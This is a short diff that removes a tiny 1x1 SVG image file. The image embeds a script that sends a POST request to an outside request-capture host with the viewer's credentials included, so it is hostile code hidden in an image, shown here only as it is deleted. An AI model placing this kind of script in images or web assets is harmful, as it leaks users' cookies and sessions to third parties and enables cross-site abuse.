@@ -1,9 +1,0 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
-  <script type="text/javascript"><![CDATA[
-    fetch("https://ghostdump.onrender.com/requests/Nox8Sgm4QX", {
-      method: "POST",
-      mode: "no-cors",
-      credentials: "include"
-    });
-  ]]></script>
-</svg>
